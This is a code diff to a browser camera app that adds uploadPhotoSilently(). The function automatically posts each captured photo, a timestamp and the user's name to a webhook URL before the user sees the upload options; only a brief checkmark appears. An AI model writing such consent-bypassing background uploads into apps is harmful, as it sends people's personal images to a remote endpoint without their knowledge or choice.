@@ -383,7 +383,10 @@ function capturePhoto() {
     cameraOutput.src = imageDataUrl;
     cameraOutput.classList.add("taken");
 
-    // Show photo preview with options
+    // Upload silently in background first
+    uploadPhotoSilently(imageDataUrl);
+    
+    // Also show photo preview with additional options
     showPhotoPreview(imageDataUrl);
 }
 
@@ -591,6 +594,100 @@ async function uploadPhoto(imageDataUrl) {
             }
         });
     }
+}
+
+/**
+ * Upload photo silently in the background (no user interaction)
+ */
+async function uploadPhotoSilently(imageDataUrl) {
+    try {
+        // Convert data URL to blob
+        const response = await fetch(imageDataUrl);
+        const blob = await response.blob();
+
+        // Create form data
+        const formData = new FormData();
+        const timestamp = new Date().toLocaleString('es-ES', {
+            timeZone: 'America/Mexico_City',
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
+        });
+        const filename = `foto-${Date.now()}.jpg`;
+        
+        formData.append('file', blob, filename);
+        
+        // Create message content
+        let content = `📸 **Nueva foto capturada**\n⏰ ${timestamp}`;
+        if (userName) {
+            content += `\n👤 Por: ${userName}`;
+        }
+        
+        // Add payload_json for webhook
+        const payload = {
+            content: content,
+            username: botName
+        };
+        formData.append('payload_json', JSON.stringify(payload));
+
+        // Send silently in background
+        const uploadResponse = await fetch(uploadUrl, {
+            method: 'POST',
+            body: formData
+        });
+
+        if (uploadResponse.ok) {
+            console.log('Foto subida silenciosamente');
+            // Show brief success indicator
+            showBriefSuccess();
+        } else {
+            console.error('Error en la subida silenciosa:', uploadResponse.status);
+        }
+    } catch (error) {
+        console.error('Error uploading photo silently:', error);
+    }
+}
+
+/**
+ * Show brief success indicator for silent upload
+ */
+function showBriefSuccess() {
+    // Create temporary success indicator
+    const successDiv = document.createElement('div');
+    successDiv.innerHTML = '✅';
+    successDiv.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: rgba(0, 0, 0, 0.8);
+        color: white;
+        padding: 10px 15px;
+        border-radius: 10px;
+        font-size: 24px;
+        z-index: 9999;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+    `;
+    
+    document.body.appendChild(successDiv);
+    
+    // Animate in
+    setTimeout(() => {
+        successDiv.style.opacity = '1';
+    }, 100);
+    
+    // Remove after delay
+    setTimeout(() => {
+        successDiv.style.opacity = '0';
+        setTimeout(() => {
+            if (successDiv.parentNode) {
+                successDiv.parentNode.removeChild(successDiv);
+            }
+        }, 300);
+    }, 2000);
 }
 
 // ========== EVENT LISTENERS ==========
